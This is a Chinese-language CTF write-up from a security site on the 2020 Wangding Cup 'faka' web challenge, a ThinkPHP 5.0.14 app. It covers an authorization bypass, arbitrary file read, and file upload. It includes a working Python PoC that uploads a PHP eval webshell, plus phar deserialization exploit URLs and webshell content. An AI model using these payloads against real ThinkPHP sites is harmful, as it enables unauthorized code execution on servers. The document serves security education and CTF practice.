# 深入剖析网鼎杯web_faka

阅读量 **187754**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-06-16 14:30:00

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t013386a22cb849279a.png)

2020网鼎杯半决赛的一道web题,网上大部分WP都没有给出这道题越权的挖掘视角,这里给出我的一种分析角度,还提供了另外一种最近在很多比赛也经常见到的phar反序列化的解法,写得不好，还请大佬们批评指正

## 0x01 越权漏洞

分析一下权限验证机制出现的问题.

访问`manage/Article/` 会自动跳转到`admin/login` 说明存在鉴权机制的  
然后先找了一下数据库,看一下有没有和权限绑定的一些表,发现是有的,  
system_auth_node这个表里面,显然这些节点访问都需要auth为3的操作,看下面的system_user表也可以知道只有超级管理员的auth权限为3,

![](https://p5.ssl.qhimg.com/t013392126711c46c00.png)

然后再看下system_node这个表, 也可以看出来is_auth为1的节点都是需要权限验证的, is_login为1 的节点都是需要登录才能访问的.
这样直接看一下admin模块有哪些控制器/方法的is_auth为0 或者甚至不在这个表就可以尝试一下越权等操作

![](https://p4.ssl.qhimg.com/t01b548cad9e514f2cc.png)

调试一下`manage/Article/`这个路由,直接全局搜索`invokeArgs`下断点,
直接run发现报错,是权限验证未通过,发现是一个类似HOOK的函数存在权限验证机制

![](https://p1.ssl.qhimg.com/t01d526746487fa4988.png)

直接跟到这个文件看一看,主要就是run方法,发现这个web应用就是根据数据库的那两个表来鉴权的, 挖越权直接对着控制器找表即可.

下面分析一下为什么`admin/index/info`方法是越权的, 因为数据库里面有两个特殊的值是`admin`,
按照开发者所写代码理解的,这样应该确保admin模块下的都会被鉴权,但是为什么会被绕过?

![](https://p1.ssl.qhimg.com/t01d90a4046c17a2e27.png)

![](https://p1.ssl.qhimg.com/t01355f3e0cc54ebd55.png)

仔细看下鉴权代码: 看下面这三行就明白了.

    
    
    $this->request = Request::instance();
    list($module, $controller, $action) = [
        $this->request->module(), 
        $this->request->controller(), 
        $this->request->action()
    ];
    $node = strtolower("{$module}/{$controller}/{$action}");
    $info = Db::name('SystemNode')->where('node', $node)->find();
    

`$node`值不会出现`admin`的情况的 ,因为存在默认值的填充, 访问`/` `$node`的值也是`index/index/index`,
所以数据库里所有不是`xxx/xxx/xxx`格式的节点全都是无效的..,所以就可以越权添加用户

![](https://p4.ssl.qhimg.com/t011460c03195d7819b.png)

仔细分析下_form方法就明白为什么可以添加高权限用户量,就不仔细分析了

## 0x02 任意文件读取

在`/application/manage/controller/Backup.php` 的`downloadBak`方法, 但是需要管理员权限才能利用

![](https://p3.ssl.qhimg.com/t012be1d2db4d1a6f5e.png)

![](https://p0.ssl.qhimg.com/t01945ddb56559a80c3.png)

## 0x03 文件上传

在`application/admin/controller/Plugs.php`的`upload`方法,
这段代码有一个奇怪的点是最后保存的文件名和检测的文件名没什么关系.

![](https://p3.ssl.qhimg.com/t018176a72b5cd48756.png)

还要注意一下`$token`和`$md5`,  
`session_id()`返回空,`token=md5($filename);`  
`$md5`要够长

poc:

    
    
    # -*- coding: utf-8 -*-    import requests
    url='http://4ab2a4e7-10a0-4278-b40d-102103ee845d.node3.buuoj.cn/admin/plugs/upload'
    headers={
        'Cookie':'menu-style=full; s7466e88d=6af28adcb2f1da4cf54c31212ded61e5'
    }
    
    f = b'''GIF98a
    <?php eval($_POST[cmd]);?>
    '''
    file = {'file': ('test.png',f)}
    
    res = requests.post(url=url,headers=headers,files=file,data={'md5':'aaaaaaaaaaaaaaaabbb1.php','token':'e8e97db6ca719f45927d7b3223ea9182'})
    print(res)
    

上传文件后访问`/static/upload/aaaaaaaaaaaaaaaa/bbb1.php` 即可

![](https://p0.ssl.qhimg.com/t01a629dea928e18e16.png)

## 0x04 phar反序列化

后来看到别的师傅wp这个框架是tp5.0.14版本开发的, 恰好这个版本有一条pop链,框架里面又有不少上传点,所以考虑能不能利用phar触发反序列化.
在本地复现成功了,但是题目没有打通 ) :

**pop链** : <https://github.com/L0nm4r/MyyPOP/tree/master/thinkphp/5.0.14>

> pop1只能在Linux下使用, pop2无这个限制

**文件上传 :** , 普通用户前台就有一个,后台就更多了

**phar:** 触发phar的点还是比较好找的,全局搜索找file_get_contents就可以了,
在`application/wechat/controller/Review.php` 的`img()`方法

![](https://p2.ssl.qhimg.com/t01985365fff5ee4ff8.png)

具体利用:

**生成phar文件** : 直接利用的pop2的. 这里有一个坑点是文件/目录权限和相对路径/绝对路径的问题

我用相对路径没有成功写文件,但是绝对路径成功了. 可能buu的环境存在目录权限问题导致没有写成功 : (

稍微修改一下pop链就好:

![](https://p0.ssl.qhimg.com/t01d4bfcf82890eb5d5.png)

然后重命名为phar.gif

**文件上传**

前台的上传点, 1.txt有邀请码, 注册一个普通用户就好

![](https://p4.ssl.qhimg.com/t01c926e3773ab66a98.png)

![](https://p0.ssl.qhimg.com/t01e5ad95c6d68f3c87.png)

F12找路径.

**phar反序列化触发:** 访问
`/wechat/Review/img?url=phar://./static/upload/60bb6f1ef3d43/60bb6f1ef3d95.gif`

**getShell**

因为写入的文件是

    
    
    <?cuc
    //000000000000
     rkvg();?>
    f:51:"<?php eval($_POST["cmd"]);?><trgNgge>netf</trgNgge>";
    

所以需要关闭短标签这个shell才生效,否则会报错退出!

> 再次温习p牛的博客 <https://www.leavesongs.com/PENETRATION/php-filter-magic.html>

![](https://p2.ssl.qhimg.com/t01886d7f8da8820770.png)

访问`/static/upload/ce83778115195eec0b229a3beab940c9.php`

## 0x05 总结

对于最后一个思路, Nepnep的比赛有类似题解,
<https://blog.csdn.net/rfrder/article/details/115105786>

三周之前就做到了这道题,现在才做完,

虽然踩了一天的坑 , 但不枉我学了两周tp开发, 调试框架终于有点感觉了

之后两周就要准备期末了,这道题就当这一段时间的总结了.

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **L0nm4r** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/243357](/post/id/243357)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [反序列化](/tag/反序列化)
  * [ThinkPHP](/tag/ThinkPHP)
  * [框架](/tag/框架)

 **+1** __10赞

 __收藏

![](https://p1.ssl.qhimg.com/t01f29eb984429cc619.png) L0nm4r

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

